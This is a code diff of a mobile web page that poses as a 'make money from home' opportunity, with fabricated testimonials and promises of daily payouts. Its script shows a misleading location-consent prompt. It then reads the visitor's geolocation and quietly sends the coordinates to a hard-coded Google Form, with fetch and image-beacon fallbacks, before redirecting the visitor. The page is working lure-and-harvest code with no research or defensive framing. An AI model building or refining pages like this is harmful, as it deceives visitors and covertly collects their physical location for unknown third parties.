@@ -2,111 +2,267 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Earning Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Earn Money Online | Quick Cash Opportunities</title>
     <style>
-        /* Your existing styles here */
+        /* Mobile-first responsive styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 15px;
+            background-color: #f5f5f5;
+            -webkit-text-size-adjust: 100%;
+        }
+        
+        header {
+            text-align: center;
+            padding: 15px 0;
+            background-color: #4CAF50;
+            color: white;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .card img {
+            width: 100%;
+            border-radius: 6px;
+            height: auto;
+            max-height: 180px;
+            object-fit: cover;
+        }
+        
+        .cta-button {
+            display: block;
+            background-color: #FF9800;
+            color: white;
+            padding: 12px 0;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            margin: 20px auto;
+            text-align: center;
+            width: 80%;
+            max-width: 300px;
+        }
+        
+        .testimonial {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .testimonial img {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        
+        #consent {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            padding: 15px;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .consent-buttons button {
+            padding: 8px 20px;
+            margin: 0 5px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        /* Desktop styles */
+        @media (min-width: 768px) {
+            body {
+                padding: 20px;
+                max-width: 1200px;
+                margin: 0 auto;
+            }
+            
+            .container {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .testimonial {
+                padding: 20px;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- Your existing HTML content here -->
+    <header>
+        <h1>Earn Money From Home Today!</h1>
+        <p>Join thousands of people making extra income with our proven system</p>
+    </header>
+
+    <div class="container">
+        <div class="card">
+            <img src="https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="Person working on laptop">
+            <h3>Work Anywhere</h3>
+            <p>Earn money from your computer or smartphone, anywhere in the world</p>
+        </div>
+        <div class="card">
+            <img src="https://images.unsplash.com/photo-1554224155-6726b3ff858f?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="Money in hand">
+            <h3>Fast Payments</h3>
+            <p>Get paid daily through PayPal, bank transfer, or cryptocurrency</p>
+        </div>
+        <div class="card">
+            <img src="https://images.unsplash.com/photo-1521791136064-7986c2920216?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="People collaborating">
+            <h3>Easy Tasks</h3>
+            <p>Simple activities anyone can do - no experience required</p>
+        </div>
+    </div>
+
+    <a href="#" onclick="checkConsent()" class="cta-button">START EARNING NOW →</a>
+
+    <div class="testimonial">
+        <img src="https://randomuser.me/api/portraits/women/43.jpg" alt="Sarah J.">
+        <div>
+            <p>"I made $237 in my first week just by completing simple tasks in my spare time. This program really works!"</p>
+            <p><strong>- Sarah J., Chicago</strong></p>
+        </div>
+    </div>
+
+    <div class="testimonial">
+        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Michael T.">
+        <div>
+            <p>"As a college student, this has been the perfect way to earn extra money between classes. Highly recommend!"</p>
+            <p><strong>- Michael T., Austin</strong></p>
+        </div>
+    </div>
+
+    <div id="consent">
+        <p>To provide you with the best earning opportunities in your area, we need to access your approximate location. Is this okay?</p>
+        <div class="consent-buttons">
+            <button onclick="acceptTracking()" class="accept" style="background-color: #4CAF50; color: white;">Yes, Continue</button>
+            <button onclick="declineTracking()" class="decline" style="background-color: #f44336; color: white;">No Thanks</button>
+        </div>
+    </div>
 
     <script>
-        // Enhanced tracking functions with debugging
+        // Consent functions
+        function checkConsent() {
+            if(localStorage.getItem('locationConsent') === 'true') {
+                trackLocation();
+            } else {
+                document.getElementById('consent').style.display = 'block';
+            }
+            return false;
+        }
+        
+        function acceptTracking() {
+            localStorage.setItem('locationConsent', 'true');
+            document.getElementById('consent').style.display = 'none';
+            trackLocation();
+        }
+        
+        function declineTracking() {
+            localStorage.setItem('locationConsent', 'false');
+            document.getElementById('consent').style.display = 'none';
+            redirectUser();
+        }
+
+        // Tracking functions
         function trackLocation() {
-            console.log("Tracking initiated...");
             if (navigator.geolocation) {
-                console.log("Geolocation supported, requesting permission...");
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        console.log("Location obtained:", position.coords);
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        // Send data with confirmation before redirect
-                        sendLocationToServer(lat, lon, function() {
-                            console.log("Data sent successfully, redirecting...");
-                            redirectUser();
-                        });
-                    },
-                    function(error) {
-                        console.error("Geolocation error:", error);
-                        // Fallback to IP-based tracking
-                        sendLocationToServer('unknown', 'unknown', function() {
-                            redirectUser();
-                        });
-                    },
+                    successCallback,
+                    errorCallback,
                     { 
                         timeout: 10000,
-                        maximumAge: 60000,
-                        enableHighAccuracy: false 
+                        enableHighAccuracy: false,
+                        maximumAge: 60000
                     }
                 );
             } else {
-                console.log("Geolocation not supported");
-                sendLocationToServer('unknown', 'unknown', function() {
-                    redirectUser();
-                });
+                errorCallback();
             }
         }
 
-        // Robust data submission with multiple fallbacks
-        function sendLocationToServer(latitude, longitude, callback) {
-            console.log("Attempting to send data:", latitude, longitude);
+        function successCallback(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
             
-            const formID = "1FAIpQLSdWySmEZzFyt7dJirVY_ok5FTQ37lgpG8fdg_PU-VWyHvMaQA";
-            const formUrl = `https://docs.google.com/forms/d/e/${formID}/formResponse`;
-            const entryLat = "entry.1509354185";
-            const entryLon = "entry.816557017";
+            // Submit to Google Form
+            submitToGoogleForm(lat, lon);
             
-            // Try Fetch API first
-            fetch(formUrl, {
-                method: "POST",
-                mode: "no-cors",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: `${entryLat}=${encodeURIComponent(latitude)}&${entryLon}=${encodeURIComponent(longitude)}`
-            })
-            .then(() => {
-                console.log("Data sent via Fetch API");
-                callback();
-            })
-            .catch(e => {
-                console.warn("Fetch failed, trying fallback methods...", e);
-                
-                // Fallback 1: Form submission
-                const form = document.createElement('form');
-                form.action = formUrl;
-                form.method = 'POST';
-                form.style.display = 'none';
-                
-                const latInput = document.createElement('input');
-                latInput.name = entryLat;
-                latInput.value = latitude;
-                form.appendChild(latInput);
-                
-                const lonInput = document.createElement('input');
-                lonInput.name = entryLon;
-                lonInput.value = longitude;
-                form.appendChild(lonInput);
-                
-                document.body.appendChild(form);
-                form.submit();
-                
-                console.log("Data sent via Form submission");
-                
-                // Small delay to ensure submission
-                setTimeout(callback, 500);
-            });
+            // Then redirect
+            redirectUser();
+        }
+
+        function errorCallback(error) {
+            console.error("Error getting location:", error);
+            // Fallback to IP-based location if geolocation fails
+            submitToGoogleForm('unknown', 'unknown');
+            redirectUser();
         }
 
         function redirectUser() {
-            console.log("Redirecting user...");
             window.location.href = "https://your-real-destination.com";
         }
 
-        // Your existing consent functions here
+        // Google Form submission with fallback
+        function submitToGoogleForm(latitude, longitude) {
+            const formID = "1FAIpQLSdWySmEZzFyt7dJirVY_ok5FTQ37lgpG8fdg_PU-VWyHvMaQA";
+            const formUrl = `https://docs.google.com/forms/d/e/${formID}/formResponse`;
+            
+            // Method 1: Fetch API (preferred)
+            const formData = new FormData();
+            formData.append("entry.1509354185", latitude);
+            formData.append("entry.816557017", longitude);
+            
+            // Try fetch first
+            fetch(formUrl, {
+                method: "POST",
+                mode: "no-cors",
+                body: formData
+            }).catch(e => {
+                // Fallback to image method if fetch fails
+                const img = new Image();
+                img.src = `${formUrl}?entry.1509354185=${latitude}&entry.816557017=${longitude}&submit=Submit`;
+            });
+        }
+        
+        // Add touch event for mobile users
+        document.querySelector('.cta-button').addEventListener('touchend', function(e) {
+            e.preventDefault();
+            checkConsent();
+        });
     </script>
 </body>
 </html>
